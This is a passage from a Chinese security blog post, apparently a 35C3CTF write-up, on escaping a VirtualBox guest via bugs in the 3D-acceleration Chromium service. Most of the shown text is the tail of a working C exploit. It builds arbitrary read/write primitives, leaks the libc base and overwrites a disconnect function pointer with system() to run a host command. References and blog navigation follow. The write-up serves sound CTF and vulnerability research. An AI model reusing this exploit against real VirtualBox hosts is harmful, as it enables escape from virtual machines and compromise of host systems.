write_buf(client,oob_buf,0xa30,0x44,&amp;data,sizeof(data));</span><br><span class="line">   //arb write</span><br><span class="line">   write_buf(client,arb_buf,size,0,buf,size);</span><br><span class="line">   return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int arb_read(int client,uint64_t conn_addr,uint64_t addr,uint32_t size,void *buf) &#123;</span><br><span class="line">   char val = 0x64;</span><br><span class="line">   //防止disconnect时free pHostBuffer时崩溃，我们将disconnect函数指针指向附近的retn指令处</span><br><span class="line">   arb_write(client,conn_addr+OFFSET_DISCONN_FUNC_PTR,0x1,&amp;val);</span><br><span class="line">   //设置pHostBuffer为目的地址</span><br><span class="line">   arb_write(client,conn_addr+OFFSET_CONN_HOSTBUF,0x8,&amp;addr);</span><br><span class="line">   //设置size</span><br><span class="line">   arb_write(client,conn_addr+OFFSET_CONN_HOSTBUFSZ,0x4,&amp;size);</span><br><span class="line">   //通过SHCRGL_GUEST_FN_READ命令读取pHostBuffer指向的内容</span><br><span class="line">   stop();</span><br><span class="line">   return read_hostbuf(client,0x100,buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">unsigned char buff[0x100] = &#123;0&#125;;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">   int idClient = hgcm_connect(&quot;VBoxSharedCrOpenGL&quot;);</span><br><span class="line">   printf(&quot;idClient=%d\n&quot;,idClient);</span><br><span class="line">   set_version(idClient);</span><br><span class="line">   //泄露出CRConnection的地址</span><br><span class="line">   LeakClient leak = leak_client(idClient);</span><br><span class="line"></span><br><span class="line">   int new_client = leak.new_client;</span><br><span class="line">   set_version(new_client);</span><br><span class="line">   uint64_t conn_addr = leak.conn_addr;</span><br><span class="line">   printf(&quot;new_client=%d new_client&#x27;s CRClient addr=0x%lx CRConnection addr=0x%lx\n&quot;,new_client,leak.client_addr,conn_addr);</span><br><span class="line">   //制造OOB对象</span><br><span class="line">   make_oob_buf(new_client);</span><br><span class="line">   hgcm_disconnect(idClient);</span><br><span class="line">   //读取函数指针，泄露地址</span><br><span class="line">   arb_read(new_client,conn_addr,conn_addr + OFFSET_ALLOC_FUNC_PTR,8,buff);</span><br><span class="line">   uint64_t alloc_addr = *((uint64_t *)buff);</span><br><span class="line">   printf(&quot;alloc_addr=0x%lx\n&quot;,alloc_addr);</span><br><span class="line">   uint64_t VBoxOGLhostcrutil_base = alloc_addr - 0x209d0;</span><br><span class="line">   uint64_t abort_got = VBoxOGLhostcrutil_base + 0x22F0B0;</span><br><span class="line">   arb_read(new_client,conn_addr,abort_got,8,buff);</span><br><span class="line">   uint64_t abort_addr = *((uint64_t *)buff);</span><br><span class="line">   printf(&quot;abort_addr=0x%lx\n&quot;,abort_addr);</span><br><span class="line">   uint64_t libc_base = abort_addr - 0x407e0;</span><br><span class="line">   uint64_t system_addr = libc_base + 0x4f550;</span><br><span class="line">   printf(&quot;libc_base=0x%lx\n&quot;,libc_base);</span><br><span class="line">   printf(&quot;system_addr=0x%lx\n&quot;,system_addr);</span><br><span class="line">   //修改disconnect函数指针为system地址</span><br><span class="line">   arb_write(new_client,conn_addr+OFFSET_DISCONN_FUNC_PTR,0x8,&amp;system_addr);</span><br><span class="line">   char *cmd = &quot;/usr/bin/galculator&quot;;</span><br><span class="line">   arb_write(new_client,conn_addr,strlen(cmd)+1,cmd);</span><br><span class="line">   //getshell</span><br><span class="line">   hgcm_disconnect(new_client);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>效果如下<br><img src="https://p2.ssl.qhimg.com/t01d4f4ea243c892bc6.png"></p>
<p>有关我前面分析到的<code>HGCM</code>协议和<code>Chromium</code>协议使用的C语言版的3dpwn库在我的<a href="https://github.com/ha1vk/3dpwn_c">github</a>，欢迎大家来个star。</p>
<h2 id="0x03-感想"><a href="#0x03-感想" class="headerlink" title="0x03 感想"></a>0x03 感想</h2><p>第一次完成了VirtualBox的虚拟机逃逸，收获很多，成就感也很大。在安全研究的这条路上还要走很远，加油。</p>
<h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h2><p><a target="_blank" rel="noopener" href="https://www.coresecurity.com/sites/default/files/private-files/publications/2016/05/corelabs-Breaking_Out_of_VirtualBox_through_3D_Acceleration-Francisco_Falcon.pdf">Breaking Out of VirtualBox through 3D Acceleration</a><br><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/58910752">48小时逃逸Virtualbox虚拟机——记一次CTF中的0day之旅</a><br><a target="_blank" rel="noopener" href="https://matshao.com/2019/05/20/Virtual-Box-Exploitation-2/">Virtual-Box-Exploitation-2</a><br><a target="_blank" rel="noopener" href="https://phoenhex.re/2018-07-27/better-slow-than-sorry">Better slow than sorry – VirtualBox 3D acceleration considered harmful</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/systemino/article/details/89716780">利用Chromium漏洞夺取CTF胜利：VitualBox虚拟机逃逸漏洞分析（CVE-2019-2446）</a><br><a href="https://github.com/niklasb/3dpwn">3dpwn</a></p>

    </div>

    
    
    

      <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/%E5%A0%86%E6%BA%A2%E5%87%BA/" rel="tag"># 堆溢出</a>
              <a href="/tags/heap-spray/" rel="tag"># heap spray</a>
              <a href="/tags/%E8%99%9A%E6%8B%9F%E6%9C%BA%E9%80%83%E9%80%B8/" rel="tag"># 虚拟机逃逸</a>
              <a href="/tags/VirtualBox/" rel="tag"># VirtualBox</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2021/04/27/virtualbox-hgcm/" rel="prev" title="VirtualBox HGCM协议研究">
      <i class="fa fa-chevron-left"></i> VirtualBox HGCM协议研究
    </a></div>
      <div class="post-nav-item">
    <a href="/2021/05/20/AntCTFxD3CTF-EasyChromeFullChain/" rel="next" title="沙箱逃逸分析 AntCTF x D^3CTF EasyChromeFullChain">
      沙箱逃逸分析 AntCTF x D^3CTF EasyChromeFullChain <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">0x00 前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="nav-number">2.</span> <span class="nav-text">0x01 前置知识</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#chromium%E5%8D%8F%E8%AE%AE"><span class="nav-number">2.1.</span> <span class="nav-text">chromium协议</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%BC%95%E8%A8%80"><span class="nav-number">2.1.1.</span> <span class="nav-text">引言</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#svcCall"><span class="nav-number">2.1.2.</span> <span class="nav-text">svcCall</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SHCRGL-GUEST-FN-WRITE-BUFFER"><span class="nav-number">2.1.3.</span> <span class="nav-text">SHCRGL_GUEST_FN_WRITE_BUFFER</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SHCRGL-GUEST-FN-WRITE-READ-BUFFERED"><span class="nav-number">2.1.4.</span> <span class="nav-text">SHCRGL_GUEST_FN_WRITE_READ_BUFFERED</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-35C3CTF-Virtualbox-NDay"><span class="nav-number">3.</span> <span class="nav-text">0x02 35C3CTF Virtualbox NDay</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#crUnpackExtendGetUniformLocation"><span class="nav-number">3.1.</span> <span class="nav-text">crUnpackExtendGetUniformLocation</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%86%E6%9E%90"><span class="nav-number">3.1.1.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8"><span class="nav-number">3.1.2.</span> <span class="nav-text">利用</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#crUnpackExtendShaderSource"><span class="nav-number">3.2.</span> <span class="nav-text">crUnpackExtendShaderSource</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%86%E6%9E%90-1"><span class="nav-number">3.2.1.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8-1"><span class="nav-number">3.2.2.</span> <span class="nav-text">利用</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#getshell"><span class="nav-number">3.3.</span> <span class="nav-text">getshell</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-%E6%84%9F%E6%83%B3"><span class="nav-number">4.</span> <span class="nav-text">0x03 感想</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-%E5%8F%82%E8%80%83"><span class="nav-number">5.</span> <span class="nav-text">0x04 参考</span></a></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">ha1vk</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">234</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">4</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">145</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2025</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">ha1vk</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
  </div>


        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="总访客量">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="总访问量">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>




  




  
<script src="/js/local-search.js"></script>













  

  

</body>
</html>
